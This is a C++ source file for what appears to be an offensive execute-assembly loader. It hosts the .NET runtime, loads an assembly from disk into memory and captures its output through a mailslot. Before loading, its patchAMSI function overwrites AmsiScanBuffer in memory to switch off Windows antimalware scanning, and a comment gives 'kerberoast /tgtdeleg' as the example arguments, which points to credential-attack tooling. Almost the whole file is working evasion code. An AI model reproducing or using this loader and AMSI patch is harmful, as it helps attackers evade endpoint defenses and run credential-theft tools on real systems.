#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable: 4244)
#include <Windows.h>
#include <mscoree.h>
#include <MetaHost.h>
#include <strsafe.h>
#include <string>
#include <iostream>

//Make sure to add $(NETFXKitsDir)Include\um to your include directories
#import "mscorlib.tlb" raw_interfaces_only, auto_rename				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
#pragma comment(lib, "mscoree.lib")

#ifdef _DEBUG
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#else
#define DEBUG_PRINT(x, ...)
#endif

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);//NtWriteVirtualMemory
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);//NtProtectVirtualMemory

using namespace mscorlib;

typedef struct _Parameter {
	_MethodInfo* pEntryPt = NULL;
	VARIANT vEmpty;
	SAFEARRAY* psaArguments = NULL;
}THPARAMETER;

THPARAMETER Parameter;

ICorRuntimeHost* g_Runtime = NULL;

HANDLE g_OrigninalStdOut = INVALID_HANDLE_VALUE;
HANDLE g_CurrentStdOut = INVALID_HANDLE_VALUE;
HANDLE g_OrigninalStdErr = INVALID_HANDLE_VALUE;
HANDLE g_CurrentStdErr = INVALID_HANDLE_VALUE;

HANDLE g_hSlot = INVALID_HANDLE_VALUE;
LPCSTR SlotName = ("\\\\.\\mailslot\\myMailSlot");

std::wstring g_NetVersion;

//Taken from : https://docs.microsoft.com/en-us/windows/win32/ipc/writing-to-a-mailslot
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName)
{
	g_hSlot = CreateMailslotA(lpszSlotName,
		0,                             // no maximum message size 
		MAILSLOT_WAIT_FOREVER,         // no time-out for operations 
		(LPSECURITY_ATTRIBUTES)NULL); // default security

	if (g_hSlot == INVALID_HANDLE_VALUE)
	{
		DEBUG_PRINT("CreateMailslot failed with %d\n", GetLastError());
		return FALSE;
	}
	else DEBUG_PRINT("Mailslot created successfully.\n");
	return TRUE;
}

// Mostly from : https://docs.microsoft.com/en-us/windows/win32/ipc/reading-from-a-mailslot
BOOL ReadSlot(std::string& output)
{
	CONST DWORD szMailBuffer = 424; //Size comes from https://docs.microsoft.com/en-us/windows/win32/ipc/about-mailslots?redirectedfrom=MSDN
	DWORD cbMessage, cMessage, cbRead;
	BOOL fResult;
	LPSTR lpszBuffer = NULL;
	LPVOID achID[szMailBuffer];
	DWORD cAllMessages;
	HANDLE hEvent;
	OVERLAPPED ov;

	cbMessage = cMessage = cbRead = 0;

	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	if (NULL == hEvent)
		return FALSE;
	ov.Offset = 0;
	ov.OffsetHigh = 0;
	ov.hEvent = hEvent;

	fResult = GetMailslotInfo(g_hSlot, // mailslot handle 
		(LPDWORD)NULL,               // no maximum message size 
		&cbMessage,                   // size of next message 
		&cMessage,                    // number of messages 
		(LPDWORD)NULL);              // no read time-out 

	if (!fResult)
	{
		DEBUG_PRINT("GetMailslotInfo failed with %d.\n", GetLastError());
		return FALSE;
	}

	if (cbMessage == MAILSLOT_NO_MESSAGE)
	{
		// DEBUG_PRINT("Waiting for a message...\n");
		return TRUE;
	}

	cAllMessages = cMessage;

	while (cMessage != 0)  // retrieve all messages
	{
		// Allocate memory for the message. 

		lpszBuffer = (LPSTR)GlobalAlloc(GPTR, lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
		if (NULL == lpszBuffer)
			return FALSE;
		lpszBuffer[0] = '\0';

		fResult = ReadFile(g_hSlot,
			lpszBuffer,
			cbMessage,
			&cbRead,
			&ov);

		if (!fResult)
		{
			DEBUG_PRINT("ReadFile failed with %d.\n", GetLastError());
			GlobalFree((HGLOBAL)lpszBuffer);
			return FALSE;
		}
		output += lpszBuffer;

		fResult = GetMailslotInfo(g_hSlot,  // mailslot handle 
			(LPDWORD)NULL,               // no maximum message size 
			&cbMessage,                   // size of next message 
			&cMessage,                    // number of messages 
			(LPDWORD)NULL);              // no read time-out 

		if (!fResult)
		{
			DEBUG_PRINT("GetMailslotInfo failed (%d)\n", GetLastError());
			return FALSE;
		}
	}
	GlobalFree((HGLOBAL)lpszBuffer);
	CloseHandle(hEvent);
	return TRUE;
}

BOOL FindVersion(VOID* assembly, DWORD length) {
	CHAR* assembly_c;
	assembly_c = (char*)assembly;
	CHAR v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

	for (DWORD i = 0; i < length; i++)
	{
		for (INT j = 0; j < 10; j++)
		{
			if (v4[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return 1;
				}
			}
		}
	}

	return 0;
}

HRESULT LoadCLR()
{
	ICLRRuntimeInfo*	pRuntimeInfo	= NULL;
	ICLRMetaHost*		pMetaHost		= NULL;
	HRESULT				hr				= 0;
	BOOL				bLoadable		= FALSE;

	// Open the runtime
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);

	if (FAILED(hr))
		goto Cleanup;

	//DotNet version v4.0.30319
	hr = pMetaHost->GetRuntime(g_NetVersion.c_str(), IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
	if (FAILED(hr))
		goto Cleanup;

	// Check if the runtime is loadable (this will fail without .Net v4.x on the system)

	hr = pRuntimeInfo->IsLoadable(&bLoadable);
	if (FAILED(hr) || !bLoadable)
		goto Cleanup;

	// Load the CLR into the current process
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&g_Runtime);
	if (FAILED(hr))
		goto Cleanup;

	// Start the CLR.
	hr = g_Runtime->Start();
	if (FAILED(hr))
		goto Cleanup;

Cleanup:

	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}
	if (FAILED(hr) && g_Runtime)
	{
		g_Runtime->Release();
		g_Runtime = NULL;
	}

	return hr;
}

DWORD WINAPI StartEntry(
	LPVOID lpParameter
)
{
	VARIANT vReturnVal;
	SecureZeroMemory(&vReturnVal, sizeof(VARIANT));
	(_MethodInfo*)(Parameter.pEntryPt)->Invoke_3(Parameter.vEmpty, Parameter.psaArguments, &vReturnVal);
	return 0;
}

HRESULT CallMethod(std::string assembly, std::string args, std::string& outputString) {
	
	SAFEARRAY*		psaArguments	= NULL;
	_AppDomainPtr	pAppDomain		= NULL;
	WCHAR*			w_ByteStr		= NULL;
	LPWSTR*			szArglist		= NULL;
	LONG			rgIndices		= 0;
	_AssemblyPtr	pAssembly		= NULL;
	_MethodInfo*	pEntryPt		= NULL;
	SAFEARRAY*		psaBytes		= NULL;
	HANDLE			hThread			= NULL;
	IUnknownPtr		pUnk			= NULL;
	HRESULT			hr				= S_OK;
	INT				nArgs			= 0;
	
	SAFEARRAYBOUND	bounds[1];
	VARIANT vReturnVal;
	VARIANT vEmpty;
	VARIANT vtPsa;

	SecureZeroMemory(&vReturnVal,	sizeof(VARIANT));
	SecureZeroMemory(&vEmpty,		sizeof(VARIANT));
	SecureZeroMemory(&vtPsa,		sizeof(VARIANT));

	vEmpty.vt	= VT_NULL;
	vtPsa.vt	= (VT_ARRAY | VT_BSTR);

	//Get a pointer to the IUnknown interface because....COM
	hr = g_Runtime->GetDefaultDomain(&pUnk);
	
	if (FAILED(hr))
		goto Cleanup;

	// Get the current app domain
	hr = pUnk->QueryInterface(IID_PPV_ARGS(&pAppDomain));

	if (FAILED(hr))
		goto Cleanup;

	// Load the assembly
	//Establish the bounds for our safe array
	bounds[0].cElements = (ULONG)assembly.size();
	bounds[0].lLbound	= 0;

	//Create a safe array and fill it with the bytes of our .net assembly
	psaBytes = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(psaBytes);
	memcpy(psaBytes->pvData, assembly.data(), assembly.size());
	SafeArrayUnlock(psaBytes);
	//Load the assembly into the app domain
	hr = pAppDomain->Load_3(psaBytes, &pAssembly);

	if (FAILED(hr))
	{
		SafeArrayDestroy(psaBytes);
		goto Cleanup;
	}

	SafeArrayDestroy(psaBytes);
	// Find the entry point
	hr = pAssembly->get_EntryPoint(&pEntryPt);

	if (FAILED(hr))
		goto Cleanup;

	//This will take our arguments and format them so they look like command line arguments to main (otherwise they are treated as a single string)
	//Credit to https://github.com/b4rtik/metasploit-execute-assembly/blob/master/HostingCLR_inject/HostingCLR/HostingCLR.cpp for getting this to work properly
	if (args.empty())
	{
		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 0);
	}
	else
	{
		//Convert to wide characters
		w_ByteStr	 = (wchar_t*)malloc((sizeof(wchar_t) * args.size() + 1));
		mbstowcs(w_ByteStr, (char*)args.data(), args.size() + 1);
		szArglist	 = CommandLineToArgvW(w_ByteStr, &nArgs);
		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);

		for (long i = 0; i < nArgs; i++)
		{
			BSTR strParam1 = SysAllocString(szArglist[i]);
			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
		}
	}

	psaArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	hr			 = SafeArrayPutElement(psaArguments, &rgIndices, &vtPsa);

	//Execute the function.  Note that if you are executing a function with return data it will end up in vReturnVal
	Parameter.pEntryPt		= pEntryPt;
	Parameter.psaArguments	= psaArguments;
	Parameter.vEmpty		= vEmpty;

	hThread = CreateThread(NULL, NULL, StartEntry,NULL, NULL, NULL);
	//hr = pEntryPt->Invoke_3(vEmpty, psaArguments, &vReturnVal);
	
	if (!hThread)
	{
		DEBUG_PRINT("CreateThread Failed With Error = %d\n", GetLastError());
		goto Cleanup;
	}

	//Reset our Output handles (the error message won't show up if they fail, just for debugging purposes)
	if (!SetStdHandle(STD_OUTPUT_HANDLE, g_OrigninalStdOut))
	{
		DEBUG_PRINT("ERROR: SetStdHandle REVERTING stdout failed.");
	}
	if (!SetStdHandle(STD_ERROR_HANDLE, g_OrigninalStdErr))
	{
		DEBUG_PRINT("ERROR: SetStdHandle REVERTING stderr failed.");
	}

	do {
		//Read from our mail slot
		if (!ReadSlot(outputString))
			DEBUG_PRINT("Failed to read from mail slot");

		if(!outputString.empty())
			printf("%s", outputString.c_str());

		if (WaitForSingleObject(hThread, 200) == WAIT_OBJECT_0)
			// thread finish
			break;
	} while (TRUE);
	
Cleanup:
	VariantClear(&vReturnVal);

	if (NULL != psaArguments)
		SafeArrayDestroy(psaArguments);
	
	psaArguments = NULL;
	pAssembly->Release();
	CloseHandle(hThread);
	return hr;
}


std::string ExecuteAssembly(std::string& assembly, std::string args)
{
	HRESULT hr;
	std::string output = "";

	//Create our mail slot
	if (!MakeSlot(SlotName))
	{
		DEBUG_PRINT("Failed to create mail slot");
		return output;
	}
	HANDLE hFile = CreateFileA(SlotName, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

	//Load the CLR
	hr = LoadCLR();
	if (FAILED(hr))
	{
		output = "failed to load CLR";
		goto END;
	}
	DEBUG_PRINT("Successfully loaded CLR\n");
	//Set stdout and stderr to our mail slot
	g_OrigninalStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	g_OrigninalStdErr = GetStdHandle(STD_ERROR_HANDLE);


	if (!SetStdHandle(STD_OUTPUT_HANDLE, hFile))
	{
		output = "SetStdHandle stdout failed.";
		goto END;
	}
	if (!SetStdHandle(STD_ERROR_HANDLE, hFile))
	{
		output = "SetStdHandle stderr failed.";
		goto END;
	}

	hr = CallMethod(assembly, args, output);
	if (FAILED(hr))
		output = "failed to call method";

END:
	if (g_hSlot != INVALID_HANDLE_VALUE)
		CloseHandle(g_hSlot);
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return output;
}

BOOL patchAMSI()
{

#ifdef _M_AMD64
	unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };//x64
#elif defined(_M_IX86)
	unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

	HINSTANCE hinst = LoadLibraryA(("amsi.dll"));
	void* pAddress = (PVOID)GetProcAddress(hinst, ("AmsiScanBuffer"));
	if (pAddress == NULL)
	{
		DEBUG_PRINT("AmsiScanBuffer failed");
		return 0;
	}

	void* lpBaseAddress = pAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(amsiPatch);

	//Change memory protection via NTProtectVirtualMemory
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA(("ntdll.dll")), ("NtProtectVirtualMemory"));
	
	NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);

	if (status != 0) {
		DEBUG_PRINT("[-] NtProtectVirtualMemory failed");
		return 0;
	}

	//Patch AMSI via NTWriteVirtualMemory
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA(("ntdll.dll")), ("NtWriteVirtualMemory"));
	status = NtWriteVirtualMemory(GetCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
	if (status != 0) {
		DEBUG_PRINT("WriteVirtualMemory Failed");
		return 0;
	}

	//Revert back memory protection via NTProtectVirtualMemory
	status = NtProtectVirtualMemory(GetCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
	if (status != 0) {
		DEBUG_PRINT("[-] NtProtectVirtualMemory2 failed");
		return 0;
	}

	//Successfully patched AMSI
	return 1;
}

int wmain(int argc,wchar_t* argv[])
{
	DWORD lpNumberOfBytesRead	= 0;
	PVOID lpFileBuffer			= NULL;
	DWORD dwFileSize			= 0;
	LPWSTR* szArglist;

	//arguments seperated by a space : "kerberoast /tgtdeleg" or just ""
	INT nArgs = 0;
	INT i;
	std::wstring wargs = L"";
	//std::string args = "";

	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	
	if (NULL == szArglist)
	{
		DEBUG_PRINT("CommandLineToArgvW failed\n");
		return -1;
	}
	else for (i = 1; i < nArgs; i++) wargs += szArglist[i];
	
	std::string args(wargs.begin(), wargs.end());

	DEBUG_PRINT("Args = %s\n", args.c_str());
	
	//Read the .net exe from disk

	LPVOID	resBuffer = NULL;
	DWORD	resSize	  = 0;
	HANDLE	hFile	  = NULL;

	hFile = CreateFileA("netprograme", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		return 0;

	dwFileSize	 = GetFileSize(hFile, NULL);
	lpFileBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hFile, lpFileBuffer, dwFileSize, &lpNumberOfBytesRead, NULL))
		return 0;

	if (FindVersion(lpFileBuffer, dwFileSize))
		g_NetVersion = L"v4.0.30319";
	else
		g_NetVersion = L"v2.0.50727";
	 
	patchAMSI();

	//No real reason to do this, it just works with the code I had already written
	std::string assemblyStr((char*)lpFileBuffer, dwFileSize);

	//Execute the Assembly
	std::string response = ExecuteAssembly(assemblyStr, args);

	VirtualFree(lpFileBuffer, dwFileSize, MEM_DECOMMIT | MEM_RELEASE);
	CloseHandle(hFile);
}

